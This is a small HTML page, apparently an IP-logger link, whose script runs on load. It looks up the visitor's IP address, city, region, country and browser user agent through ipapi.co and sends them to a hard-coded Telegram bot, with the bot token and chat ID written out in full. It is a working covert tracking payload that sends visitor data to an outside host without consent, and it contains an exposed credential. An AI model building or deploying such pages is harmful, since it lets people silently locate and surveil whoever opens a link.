<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Visitor Tracker</title>
</head>
<body>
<h3>Tracking Visitor...</h3>
<script>
fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    const visitorInfo = {
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country_name,
      userAgent: navigator.userAgent
    };

    // আপনার Bot Token এবং Chat ID
    const token = "8240644762:AAGe-Af7IIuf89L30Ss7Kcx7vc-CsF0RfIc";
    const chat_id = "7079142411";

    const message = `🌐 New Visitor:
IP: ${visitorInfo.ip}
Location: ${visitorInfo.city}, ${visitorInfo.region}, ${visitorInfo.country}
Device: ${visitorInfo.userAgent}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
  })
  .catch(err => console.error("Error fetching visitor info:", err));
</script>
</body>
</html>
